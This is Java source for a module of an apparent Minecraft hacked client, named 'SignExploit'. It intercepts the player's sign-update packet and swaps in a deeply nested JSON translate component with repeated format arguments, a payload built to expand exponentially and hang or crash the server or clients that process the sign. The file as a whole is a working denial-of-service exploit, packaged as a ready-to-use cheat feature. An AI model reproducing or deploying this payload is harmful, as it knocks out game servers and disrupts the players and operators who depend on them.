package ja.tabio.argon.module.impl.hack.exploit;

import io.github.racoondog.norbit.EventHandler;
import ja.tabio.argon.event.impl.ProcessPacketEvent;
import ja.tabio.argon.module.Module;
import ja.tabio.argon.module.annotation.HackData;
import ja.tabio.argon.module.annotation.ModuleData;
import ja.tabio.argon.module.enums.HackCategory;
import ja.tabio.argon.module.enums.ModuleCategory;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.ChatComponentTranslation;
import net.minecraft.util.IChatComponent;

@ModuleData(name = "SignExploit", category = ModuleCategory.HACK)
@HackData(hackCategory = HackCategory.EXPLOIT)
public class SignExploitHack extends Module {

    @EventHandler
    public final void onPacket(ProcessPacketEvent packetEvent) {
        if (packetEvent.packet instanceof C12PacketUpdateSign c12PacketUpdateSign) {
            mc.thePlayer.sendQueue.addToSendQueueSilent(new C12PacketUpdateSign(c12PacketUpdateSign.getPosition(), new IChatComponent[] {
                    new ChatComponentTranslation("{\\\"translate\\\":\\\"%2\\$s%2\\$s%2\\$s%2\\$s%2\\$s\\\",\\\"with\\\":[\\\"\\\",{\\\"translate\\\":\\\"%2\\$s%2\\$s%2\\$s%2\\$s%2\\$s\\\",\\\"with\\\":[\\\"\\\",{\\\"translate\\\":\\\"%2\\$s%2\\$s%2\\$s%2\\$s%2\\$s\\\",\\\"with\\\":[\\\"\\\",{\\\"translate\\\":\\\"%2\\$s%2\\$s%2\\$s%2\\$s%2\\$s\\\",\\\"with\\\":[\\\"\\\",{\\\"translate\\\":\\\"%2\\$s%2\\$s%2\\$s%2\\$s%2\\$s\\\",\\\"with\\\":[\\\"\\\",{\\\"translate\\\":\\\"%2\\$s%2\\$s%2\\$s%2\\$s\\\",\\\"with\\\":[\\\"\\\",{\\\"translate\\\":\\\"%2\\$s%2\\$s%2\\$s%2\\$s\\\",\\\"with\\\":[\\\"\\\",{\\\"translate\\\":\\\"%2\\$s%2\\$s%2\\$s%2\\$s\\\",\\\"with\\\":[\\\"a\\\", \\\"a\\\"]}]}]}]}]}]}]}]}"),
                    new ChatComponentText(""),
                    new ChatComponentText(""),
                    new ChatComponentText("")
            }));
            packetEvent.cancelled = true;
        }
    }

}
